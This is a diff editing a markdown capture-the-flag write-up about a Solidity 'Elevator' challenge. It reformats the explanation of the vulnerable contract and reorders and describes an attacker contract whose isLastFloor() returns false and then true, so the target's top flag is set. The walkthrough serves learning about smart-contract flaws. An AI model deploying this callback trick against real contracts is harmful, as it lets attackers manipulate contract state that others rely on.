@@ -29,7 +29,11 @@ Challenge's message.
 
 >This elevator won't let you reach the top of your building. Right?
 
-This Solidity code represents an elevator contract with a corresponding interface for a building. The elevator contract (**Elevator**) keeps track of the current floor and whether it has reached the top floor. The **goTo** function is used to move the elevator to a specified floor. The **Building** interface defines a single function **isLastFloor** that takes a floor number as an argument and returns a boolean value indicating whether it is the last floor in the building.
+This Solidity code represents an elevator contract with a corresponding interface for a building. 
+
+- The elevator contract (**Elevator**) keeps track of the current floor and whether it has reached the top floor.
+- The **goTo** function is used to move the elevator to a specified floor.
+- The **Building** interface defines a single function **isLastFloor** that takes a floor number as an argument and returns a boolean value indicating whether it is the last floor in the building.
 
 In the **goTo** function, the contract checks if the specified floor is not the last floor by calling the **isLastFloor** function of the **building** instance (which is the contract that called the **goTo** function). If it is not the last floor, the **floor** variable is updated with the new floor number, and the **top** variable is set based on whether the new floor is the last floor. The code is missing some essential details such as the implementation of the **Building** interface and the deployment of the contracts, but this is the basic idea behind this elevator contract.
 
@@ -85,6 +89,11 @@ contract Attack{
 
     bool x = false;
 
+    function attack(address _target)external{
+        IElevator target = IElevator(_target);
+        target.goTo(1);
+    }
+
     function isLastFloor(uint)external returns(bool){
         if(x){
             return true;
@@ -92,13 +101,8 @@ contract Attack{
         x = true;
         return false;
     }
-
-    function attack(address _target)external{
-        IElevator target = IElevator(_target);
-        target.goTo(1);
-    }
 }
 ```
 
-In our attack contract, firstly we defined an interface named **IElavator** which will help us to call **goTo()** function from the target contract. Secondly, we have boolean type of a **x** variable which defined as false when the defination. Next, there is **isLastFloor()** function which will have call from our *goTo()* function to check the last floor. But, when its first check, the function returns false and bypass the  `! building.isLastFloor(_floor)` statement. In the second check, it returns true and set top vairable as true. Thus, we will solve the challenge.
+In our attack contract, firstly we defined an interface named **IElavator** which will help us to call **goTo()** function from the target contract. Secondly, we have boolean type of a **x** variable which defined as false when the defination. Next, we have an **attack()** function that takes a target contract's address as an argument. It creates an instance with **IElevator** interface and call the **goTo()** function from this instance. Finally, there is **isLastFloor()** function which will have call from our **goTo()** function to check the last floor. But, when its first check, the function returns false and bypass the `! building.isLastFloor(_floor)` statement. In the second check, it returns true and set top vairable as true. Thus, we will solve the challenge.
 
